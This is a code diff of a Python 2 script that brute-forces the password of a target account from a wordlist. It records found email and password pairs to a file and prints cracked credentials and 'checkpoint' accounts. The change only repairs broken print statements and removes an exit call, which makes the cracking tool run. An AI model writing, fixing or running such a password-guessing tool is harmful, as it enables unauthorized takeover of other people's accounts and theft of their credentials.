@@ -30,13 +30,13 @@ def main():
     else:
         os.system('clear')
         print logo
-        jalan '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
+        print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
         try:
             email = raw_input('\x1b[1;91m[+] \x1b[1;92mID\x1b[1;97m/\x1b[1;92mEmail \x1b[1;97mTarget \x1b[1;91m:\x1b[1;97m ')
             passw = raw_input('\x1b[1;91m[+] \x1b[1;92mWordlist \x1b[1;97mext(password.txt) \x1b[1;91m: \x1b[1;97m')
             total = open(passw, 'r')
             total = total.readlines()
-            jalan '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
+            print '\033[1;31;40m ●════════════════════════◄►════════════════════════●'
             print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mTarget \x1b[1;91m:\x1b[1;97m ' + email
             print '\x1b[1;91m[+] \x1b[1;92mTotal\x1b[1;96m ' + str(len(total)) + ' \x1b[1;92mPassword'
             jalan('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
@@ -63,11 +63,11 @@ def main():
                             ceks.write(email + ' <==> ' + pw + '\n')
                             ceks.close()
                             print '\n\x1b[1;91m[+] \x1b[1;92mFounded.'
-                            jalan  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
+                            print  "\033[1;36;40m ●════════════════════════◄►════════════════════════●"
                             print '\x1b[1;91m[!] \x1b[1;93mAccount Checkpoint'
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mUsername \x1b[1;91m:\x1b[1;97m ' + email
                             print '\x1b[1;91m[\xe2\x9e\xb9] \x1b[1;92mPassword \x1b[1;91m:\x1b[1;97m ' + pw
-                            keluar()
+                            
                 except requests.exceptions.ConnectionError:
                     print '\x1b[1;91m[!] Connection Error'
                     time.sleep(1)
